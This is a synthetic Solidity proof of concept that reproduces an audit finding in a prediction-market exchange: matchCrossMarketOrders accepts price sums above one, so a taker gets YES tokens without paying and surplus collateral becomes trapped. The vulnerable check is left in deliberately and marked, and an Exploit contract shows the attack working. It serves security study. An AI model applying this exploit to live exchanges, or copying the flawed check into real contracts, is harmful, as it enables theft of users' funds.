// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Myriad CLOB — matchCrossMarketOrders free YES when priceSum > ONE
    (Cyfrin 2026-03-13, finding #65419)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: matchCrossMarketOrders only requires priceSum >= ONE, not
    == ONE. Maker notionals are rounded down and summed; taker notional is
        notionalSoFar >= fillAmount ? 0 : fillAmount - notionalSoFar
    When priceSum > ONE, maker notionals can exceed fillAmount so the taker
    pays 0 collateral yet receives fillAmount YES tokens. Surplus collateral
    is trapped in the exchange with no withdrawal path.

    Blamed lines preserved with @> VULN markers.
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        require(a >= amt, "allow");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        require(balanceOf[from] >= amt, "bal");
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract ConditionalTokens {
    mapping(uint256 => mapping(address => uint256)) public balanceOf; // tokenId => owner => bal

    function getTokenId(uint256 marketId, uint256 outcomeIndex) public pure returns (uint256) {
        return uint256(keccak256(abi.encode(marketId, outcomeIndex)));
    }

    function mint(address to, uint256 tokenId, uint256 amount) external {
        balanceOf[tokenId][to] += amount;
    }
}

contract MyriadCTFExchange {
    uint256 public constant ONE = 1e18;

    MockERC20 public immutable collateral;
    ConditionalTokens public immutable ctf;

    enum Side {
        Buy,
        Sell
    }

    struct Order {
        address maker;
        uint256 marketId;
        uint256 outcomeIndex;
        Side side;
        uint256 amount;
        uint256 price;
    }

    constructor(MockERC20 col, ConditionalTokens _ctf) {
        collateral = col;
        ctf = _ctf;
    }

    function matchCrossMarketOrders(Order[] memory orders, uint256 fillAmount) external {
        require(orders.length >= 2, "orders");
        uint256 priceSum;
        for (uint256 i = 0; i < orders.length; i++) {
            priceSum += orders[i].price;
        }
        // MyriadCTFExchange.sol:252
        require(priceSum >= ONE, "price sum < 1"); // @> VULN: allows priceSum > ONE (should be == ONE)

        uint256 notionalSoFar;
        for (uint256 i = 0; i < orders.length - 1; i++) {
            uint256 n = fillAmount * orders[i].price / ONE;
            notionalSoFar += n;
            require(collateral.transferFrom(orders[i].maker, address(this), n), "maker pay");
        }

        // MyriadCTFExchange.sol:263-264
        uint256 notional = notionalSoFar >= fillAmount ? 0 : fillAmount - notionalSoFar; // @> VULN: when priceSum>ONE makers overpay → taker pays 0
        // FIX: each buyer pays fillAmount * price / ONE; route surplus to treasury/feeModule

        Order memory taker = orders[orders.length - 1];
        if (notional > 0) {
            require(collateral.transferFrom(taker.maker, address(this), notional), "taker pay");
        }

        for (uint256 i = 0; i < orders.length; i++) {
            uint256 tokenId = ctf.getTokenId(orders[i].marketId, orders[i].outcomeIndex);
            ctf.mint(orders[i].maker, tokenId, fillAmount);
        }

        // Send fillAmount to adapter sink; surplus remains stuck on exchange
        if (collateral.balanceOf(address(this)) >= fillAmount) {
            collateral.transfer(address(0xAdA9), fillAmount);
        }
    }
}

contract Helper {
    MockERC20 public immutable wcol;
    MyriadCTFExchange public immutable exchange;

    constructor(MockERC20 w, MyriadCTFExchange e) {
        wcol = w;
        exchange = e;
    }

    function approveMax() external {
        wcol.approve(address(exchange), type(uint256).max);
    }
}

contract Exploit {
    MockERC20 public wcol; // CREATE 1
    ConditionalTokens public ctf; // CREATE 2
    MyriadCTFExchange public exchange; // CREATE 3
    Helper public alice; // CREATE 4
    Helper public bob; // CREATE 5
    Helper public charlie; // CREATE 6

    uint256 public constant FILL = 100 ether;
    uint256 public constant ONE = 1e18;

    uint256 public charliePaid;
    uint256 public charlieYes;
    uint256 public stuckSurplus;

    constructor() {
        wcol = new MockERC20("WCOL", "WCOL");
        ctf = new ConditionalTokens();
        exchange = new MyriadCTFExchange(wcol, ctf);
        alice = new Helper(wcol, exchange);
        bob = new Helper(wcol, exchange);
        charlie = new Helper(wcol, exchange);
    }

    function run() external {
        wcol.mint(address(alice), 200 ether);
        wcol.mint(address(bob), 200 ether);
        wcol.mint(address(charlie), 200 ether);
        alice.approveMax();
        bob.approveMax();
        charlie.approveMax();

        uint256 charlieBefore = wcol.balanceOf(address(charlie));
        uint256 exchangeBefore = wcol.balanceOf(address(exchange));

        // priceSum = 0.60 + 0.60 + 0.10 = 1.30 > ONE
        // maker notionals: 60 + 60 = 120 >= fill 100 → taker notional = 0
        MyriadCTFExchange.Order[] memory orders = new MyriadCTFExchange.Order[](3);
        orders[0] = MyriadCTFExchange.Order({
            maker: address(alice),
            marketId: 1,
            outcomeIndex: 0,
            side: MyriadCTFExchange.Side.Buy,
            amount: FILL,
            price: (60 * ONE) / 100
        });
        orders[1] = MyriadCTFExchange.Order({
            maker: address(bob),
            marketId: 2,
            outcomeIndex: 0,
            side: MyriadCTFExchange.Side.Buy,
            amount: FILL,
            price: (60 * ONE) / 100
        });
        orders[2] = MyriadCTFExchange.Order({
            maker: address(charlie),
            marketId: 3,
            outcomeIndex: 0,
            side: MyriadCTFExchange.Side.Buy,
            amount: FILL,
            price: (10 * ONE) / 100
        });

        exchange.matchCrossMarketOrders(orders, FILL);

        charliePaid = charlieBefore - wcol.balanceOf(address(charlie));
        uint256 tokenId = ctf.getTokenId(3, 0);
        charlieYes = ctf.balanceOf(tokenId, address(charlie));
        stuckSurplus = wcol.balanceOf(address(exchange)) - exchangeBefore;

        // HARM: taker paid 0, received FILL YES; 20e18 collateral stuck on exchange
        require(charliePaid == 0, "taker should pay zero");
        require(charlieYes == FILL, "taker should receive free YES");
        require(stuckSurplus == 20 ether, "surplus not trapped");
    }
}
